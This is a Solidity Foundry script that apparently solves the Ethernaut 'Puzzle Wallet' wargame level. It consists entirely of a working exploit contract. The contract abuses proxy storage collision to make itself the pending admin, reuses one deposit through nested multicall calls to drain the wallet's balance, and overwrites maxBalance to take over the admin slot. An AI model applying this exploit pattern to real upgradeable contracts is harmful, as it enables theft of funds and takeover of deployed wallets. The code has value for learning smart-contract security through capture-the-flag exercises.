// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract PuzzleWalletSolution is Script {
    address target = 0x485c79729223C079D50Effb4Da608233a659e783;

    function run() external {
        vm.startBroadcast();
        Hack hack = new Hack(IWalletProxy(target), vm.envAddress("MY_ADDRESS"));
        address(hack).call{value: 0.001 ether}("");
        hack.attack();
        vm.stopBroadcast();
    }
}

interface IWalletProxy {
    function proposeNewAdmin(address _newAdmin) external;
    function approveNewAdmin(address _expectedAdmin) external;
    function upgradeTo(address _newImplementation) external;
    function init(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function maxBalance() external view returns (uint256);
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function admin() external view returns (address);
    function execute(address to, uint256 value, bytes calldata data) external payable;
}

contract Hack {
    IWalletProxy wallet;
    address me;

    constructor(IWalletProxy _wallet, address _me) {
        wallet = _wallet;
        me = _me;
    }

    function attack() public {
        wallet.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));

        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = deposit_data[0];
        data[1] = abi.encodeWithSelector(wallet.multicall.selector, deposit_data);

        wallet.multicall{value: 0.001 ether}(data);

        wallet.execute(address(this), 0.002 ether, "");

        wallet.setMaxBalance(uint256(uint160(me)));

        require(wallet.admin() == me, "Not the admin");
    }

    receive() external payable {}
}
